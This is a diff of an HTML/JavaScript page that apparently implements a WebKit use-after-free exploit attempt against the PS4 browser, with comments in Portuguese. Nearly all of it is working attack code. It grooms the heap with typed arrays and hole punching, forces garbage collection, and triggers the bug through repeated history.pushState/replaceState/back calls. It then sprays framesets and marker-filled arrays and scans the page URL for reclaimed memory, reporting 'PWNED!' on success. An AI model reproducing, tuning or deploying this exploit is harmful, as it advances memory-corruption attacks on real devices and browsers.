@@ -2,92 +2,130 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Final PSFree Strategy</title>
-
+<title>PS4 WebKit – Heap Feng Shui + UAF Reclamation</title>
+<style>
+    body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
+    button { 
+        font-size:14px; padding:12px; margin:5px; 
+        background:#222; color:#0f0; border:1px solid #0f0; cursor:pointer; width: 350px;
+        text-transform: uppercase; font-weight: bold;
+    }
+    button:hover { background:#0f0; color:#000; }
+    #log { white-space: pre-wrap; border-top: 1px solid #333; margin-top: 20px; color: #aaa; }
+    .success { color: #0f0; font-weight: bold; font-size: 1.2em; }
+    .info { color: #00bfff; }
+</style>
 </head>
 <body>
-<h2>PS4 WebKit – fastMalloc Exhaustion</h2>
-<div id="status">Ready</div>
-<button onclick="runStepD()">RUN PSFREE RECLAMATION</button>
+<h2>PS4 WebKit: Heap Feng Shui Strategy</h2>
+<div id="status">Status: IDLE</div>
+<button onclick="executeExploit()">RUN RECLAMATION EXPLOIT</button>
 <div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
-function log(m){ logEl.textContent += m + "\n"; }
+function log(m, type="") { 
+    const span = document.createElement("span");
+    if(type) span.className = type;
+    span.textContent = m + "\n";
+    logEl.appendChild(span);
+}
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-// Técnica do psfree.mjs: Força o Garbage Collector
+// 1. Forçar Garbage Collection (Baseado no psfree.mjs)
 function gc() {
-    log("Forcing GC...");
-    for(let i=0; i<10; i++) {
-        new Uint8Array(4 * 1024 * 1024); 
+    log("Iniciando GC para limpeza...", "info");
+    for(let i=0; i<15; i++) {
+        new Uint8Array(1024 * 1024 * 2); // 2MB cada
     }
 }
 
+// 2. O seu Gatilho UAF (Ajustado para estabilidade)
 async function triggerBaseUAF() {
-    logEl.textContent = "";
-    log("=== STARTING STABLE UAF (i < 48) ===");
+    log("Disparando Gatilho UAF (history.pushState)...", "info");
     let size = 977;
     const STEP = 14461;
     for(let i=0; i<48; i++){
         let frag = "V".repeat(size); 
         history.pushState({}, "", "#" + frag);
         history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
-        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+        
+        // Se houver o evento blur, ele entraria aqui
+        if(i % 6 === 0) {
+            setTimeout(() => history.back(), 0);
+        }
         size += STEP;
-        await sleep(5);
     }
-    await sleep(40);
+    await sleep(20);
 }
 
-async function runStepD() {
+async function executeExploit() {
+    logEl.textContent = "";
+    document.getElementById("status").textContent = "Status: RUNNING...";
+
+    // --- FASE 1: DEFRAGMENTAÇÃO ---
+    log("Fase 1: Defragmentando Heap (Aterro)...");
+    let anchor = [];
+    for(let i = 0; i < 1500; i++) {
+        anchor.push(new Uint32Array(0x100).fill(0xdeadbeef));
+    }
+
+    // --- FASE 2: HOLE PUNCHING ---
+    log("Fase 2: Hole Punching (Criando lacunas)...");
+    for(let i = 0; i < anchor.length; i += 2) {
+        anchor[i] = null; // Libera blocos intercalados
+    }
+    gc(); // Limpa os blocos nulos para o WebKit reutilizar
+
+    // --- FASE 3: O GATILHO ---
     await triggerBaseUAF();
+
+    // --- FASE 4: SPRAY & RECLAMATION ---
+    log("Fase 4: Spraying para ocupação de memória...");
     
-    // 1. Limpa a Heap antes de sprayar (Essencial no PSFree)
-    gc();
-    
-    log("Spraying fastMalloc via Framesets...");
+    // Spray de Framesets (fastMalloc)
     let sprayFrames = [];
-    
-    // Técnica do psfree.mjs: Alocação via frameset.rows
-    // Isso entra na partição fastMalloc
     const rowsPattern = ",".repeat(254); 
-    for(let i = 0; i < 400; i++) {
+    for(let i = 0; i < 500; i++) {
         let fset = document.createElement("frameset");
-        fset.rows = rowsPattern; // Dispara makeUniqueArray
+        fset.rows = rowsPattern;
         sprayFrames.push(fset);
     }
 
-    log("Spraying Oversize Arrays...");
+    // Spray de Arrays Controlados
     let sprayArrays = [];
-    // Técnica do memtools.mjs: Oversize alocação (> 1000 bytes)
-    const TARGET_SIZE = 400000; 
-    for(let i = 0; i < 200; i++) {
+    const TARGET_SIZE = 340356; 
+    for(let i = 0; i < 300; i++) {
         let a = new Uint32Array(TARGET_SIZE / 4);
-        a.fill(0x41424344); // 'ABCD'
+        a.fill(0x41424344); // Marcador 'ABCD'
         sprayArrays.push(a);
     }
 
-    window.keepAlive = [sprayFrames, sprayArrays];
-    await sleep(50);
+    window.keepAlive = [anchor, sprayFrames, sprayArrays];
+    await sleep(100);
 
+    // --- VERIFICAÇÃO ---
     let url = document.URL;
-    log("Scanning offsets for Reclamation...");
-    
+    log("Escaneando memória reclamada...");
     let found = false;
-    // Buscando o marcador 0x44 (D de ABCD)
-    for(let off = 34; off < 5000; off++) {
+    
+    // Verificamos se o marcador 0x44 (D) ou 0x41 (A) substituiu o 'V' na URL
+    for(let off = 0; off < url.length; off++) {
         let code = url.charCodeAt(off);
         if(code === 0x44 || code === 0x41) {
-            log("SUCCESS! Reclaimed memory at [" + off + "]: 0x" + code.toString(16).toUpperCase());
+            log(`\n!!! SUCESSO !!!`, "success");
+            log(`Memória Reclamada no Offset [${off}]: 0x${code.toString(16).toUpperCase()}`, "success");
+            log(`O WebKit está lendo nossos dados como se fossem a URL!`, "success");
             found = true;
+            document.getElementById("status").textContent = "Status: PWNED!";
             break;
         }
     }
-    
+
     if(!found) {
-        log("Falha: Memória ainda presa em 'V' ou URL.");
-        log("DICA: Tente aumentar o TARGET_SIZE para 400000.");
+        log("\nFalha: O marcador não foi encontrado.", "info");
+        log("Tentativa: Aumente o número de âncoras na Fase 1 ou o TARGET_SIZE.");
+        document.getElementById("status").textContent = "Status: FAILED";
     }
 }
 </script>
